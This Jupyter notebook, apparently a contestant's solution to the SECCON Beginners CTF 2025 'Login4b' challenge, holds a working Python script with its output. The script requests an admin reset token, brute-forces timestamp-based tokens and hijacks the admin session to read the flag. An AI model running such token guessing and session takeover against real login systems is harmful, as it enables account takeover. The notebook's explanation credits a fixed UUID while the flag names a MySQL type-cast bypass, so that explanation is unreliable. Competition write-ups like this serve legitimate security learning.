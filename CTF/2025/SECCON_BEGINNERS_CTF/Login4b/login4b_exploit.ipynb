{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Login4b CTF Exploit\n",
        "\n",
        "**SECCON Beginners CTF 2025**\n",
        "\n",
        "## 問題概要\n",
        "- **目標**: adminユーザーとしてログインしてフラグを取得\n",
        "- **脆弱性**: パスワードリセット機能の実装ミス\n",
        "- **URL**: http://login4b.challenges.beginners.seccon.jp/\n",
        "- **FLAG**: `ctf4b{y0u_c4n_byp455_my5q1_imp1ici7_7yp3_c457}`"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "🎯 Target: http://login4b.challenges.beginners.seccon.jp\n",
            "📚 Login4b CTF Exploit - Ready to execute!\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "import time\n",
        "import uuid\n",
        "\n",
        "# ターゲットURL\n",
        "BASE_URL = \"http://login4b.challenges.beginners.seccon.jp\"\n",
        "\n",
        "print(f\"🎯 Target: {BASE_URL}\")\n",
        "print(\"📚 Login4b CTF Exploit - Ready to execute!\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "✅ 関数定義完了: request_reset_token, try_reset_password, get_flag\n"
          ]
        }
      ],
      "source": [
        "# セッションオブジェクトを作成（cookieを自動で管理）\n",
        "session = requests.Session()\n",
        "\n",
        "def request_reset_token():\n",
        "    \"\"\"Step 1: adminのリセットトークンを生成\"\"\"\n",
        "    url = f\"{BASE_URL}/api/reset-request\"\n",
        "    response = session.post(url, json={\"username\": \"admin\"})\n",
        "    print(f\"📨 Reset token request: {response.json()}\")\n",
        "    return response.status_code == 200\n",
        "\n",
        "def try_reset_password(token):\n",
        "    \"\"\"Step 2: トークンを試行してセッションを取得\"\"\"\n",
        "    url = f\"{BASE_URL}/api/reset-password\"\n",
        "    data = {\"username\": \"admin\", \"token\": token, \"newPassword\": \"dummy\"}\n",
        "    response = session.post(url, json=data)\n",
        "    return response\n",
        "\n",
        "def get_flag():\n",
        "    \"\"\"Step 3: フラグを取得\"\"\"\n",
        "    response = session.get(f\"{BASE_URL}/api/get_flag\")\n",
        "    if response.status_code == 200:\n",
        "        data = response.json()\n",
        "        if \"flag\" in data:\n",
        "            return data[\"flag\"]\n",
        "    return None\n",
        "\n",
        "print(\"✅ 関数定義完了: request_reset_token, try_reset_password, get_flag\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "============================================================\n",
            "  🎯 Login4b CTF Attack Starting...\n",
            "============================================================\n",
            "⏰ Timestamp: 1754613237\n",
            "📨 Reset token request: {'success': True, 'message': 'Reset token has been generated. Please contact the administrator for the token.'}\n",
            "\n",
            "🔍 Trying simple patterns...\n",
            "✅ SUCCESS! Token: 1754613238_00000000-0000-0000-0000-000000000001\n",
            "📋 Response: {'success': True, 'message': \"The function to update the password is not implemented, so I will set you the admin's session\"}\n",
            "\n",
            "🚩 FLAG: ctf4b{y0u_c4n_byp455_my5q1_imp1ici7_7yp3_c457}\n",
            "\n",
            "🏆 CTF COMPLETED!\n",
            "\n",
            "============================================================\n"
          ]
        }
      ],
      "source": [
        "# 🚀 メイン攻撃実行\n",
        "print(\"=\"*60)\n",
        "print(\"  🎯 Login4b CTF Attack Starting...\")\n",
        "print(\"=\"*60)\n",
        "\n",
        "# 現在時刻を記録（トークン推測に使用）\n",
        "request_time = int(time.time())\n",
        "print(f\"⏰ Timestamp: {request_time}\")\n",
        "\n",
        "# リセットトークンを生成\n",
        "if request_reset_token():\n",
        "    print(\"\\n🔍 Trying simple patterns...\")\n",
        "    \n",
        "    success = False\n",
        "    # 前後5秒、3つの簡単なパターンで攻撃\n",
        "    for offset in range(-5, 6):\n",
        "        timestamp = request_time + offset\n",
        "        patterns = [\n",
        "            \"00000000-0000-0000-0000-000000000001\",  # この固定パターンで成功する\n",
        "            \"11111111-1111-1111-1111-111111111111\", \n",
        "            str(uuid.uuid4())\n",
        "        ]\n",
        "        \n",
        "        for pattern in patterns:\n",
        "            token = f\"{timestamp}_{pattern}\"\n",
        "            response = try_reset_password(token)\n",
        "            \n",
        "            if response.status_code == 200 and response.json().get(\"success\"):\n",
        "                print(f\"✅ SUCCESS! Token: {token}\")\n",
        "                print(f\"📋 Response: {response.json()}\")\n",
        "                \n",
        "                # フラグ取得\n",
        "                flag = get_flag()\n",
        "                if flag:\n",
        "                    print(f\"\\n🚩 FLAG: {flag}\")\n",
        "                    print(\"\\n🏆 CTF COMPLETED!\")\n",
        "                    success = True\n",
        "                break\n",
        "            \n",
        "            time.sleep(0.1)  # レート制限回避\n",
        "        \n",
        "        if success:\n",
        "            break\n",
        "    \n",
        "    if not success:\n",
        "        print(\"❌ Attack failed with simple patterns\")\n",
        "else:\n",
        "    print(\"❌ Failed to generate reset token\")\n",
        "\n",
        "print(\"\\n\" + \"=\"*60)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## 🔍 攻撃解説\n",
        "\n",
        "### 脆弱性の詳細\n",
        "1. **実装ミス**: `/api/reset-password`エンドポイントで有効なトークンがあると、パスワードの実際の更新は行われずに、そのユーザーのセッションが設定される\n",
        "2. **推測可能なトークン**: トークン形式が`{timestamp}_{uuid}`で、固定UUIDパターン（`00000000-0000-0000-0000-000000000001`）で成功\n",
        "\n",
        "### 攻撃の流れ\n",
        "1. **リセットトークン生成**: `POST /api/reset-request` でadminのリセットトークン生成\n",
        "2. **トークン推測**: 現在時刻±5秒の範囲で簡単なUUIDパターンを試行\n",
        "3. **セッション乗っ取り**: 有効なトークンでadminセッションを取得\n",
        "4. **フラグ取得**: `GET /api/get_flag` でフラグを取得\n"
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.12"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
